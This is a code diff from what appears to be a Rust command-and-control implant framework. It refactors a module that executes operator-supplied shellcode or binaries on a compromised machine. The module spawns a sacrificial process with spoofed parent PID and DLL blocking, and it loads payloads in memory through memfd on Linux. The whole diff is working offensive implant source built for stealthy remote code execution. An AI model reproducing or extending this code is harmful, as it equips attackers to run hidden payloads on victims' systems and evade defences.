@@ -1,5 +1,6 @@
 use crate::{check_request, to_error, Module, Result, TaskResult};
 use async_trait::async_trait;
+use malefic_helper::common::format_cmdline;
 use malefic_helper::protobuf::implantpb::spite::Body;
 use malefic_helper::protobuf::implantpb::AssemblyResponse;
 use malefic_trait::module_impl;
@@ -19,21 +20,17 @@ impl Module for ExecuteShellcode {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let bin = request.bin;
         let sacrifice = request.sacrifice;
-        let mut par: String = String::new();
+        let params = request.args;
+        let process_name = request.process_name;
         let mut is_need_sacrifice = false;
         let mut ppid = 0;
         let mut is_block_dll = false;
         let mut ret: Vec<u8> = Vec::new();
-
-        let mut response = AssemblyResponse::default();
+        let par = format_cmdline(process_name, params);
+        
         unsafe {
             if sacrifice.is_some() {
                 let sacrifice = sacrifice.unwrap();
-                for i in sacrifice.params {
-                    par += &i;
-                    par += " ";
-                }
-                par += "\x00";
                 is_need_sacrifice = true;
                 ppid = sacrifice.ppid;
                 is_block_dll = sacrifice.block_dll;
@@ -50,15 +47,17 @@ impl Module for ExecuteShellcode {
             }
             #[cfg(target_os = "linux")]
             {
-                ret = to_error!(malefic_helper::linux::loader::memfd::loader(bin, request.output))?;
+                ret = to_error!(malefic_helper::linux::loader::memfd::loader(
+                    bin,
+                    request.output
+                ))?;
             }
         }
 
-        response.status = 0;
-        response.data = ret;
-        Ok(TaskResult::new_with_body(
-            id,
-            Body::AssemblyResponse(response),
-        ))
+        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(AssemblyResponse{
+            status: 0,
+            data: ret,
+            err: "".to_string(),
+        })))
     }
 }
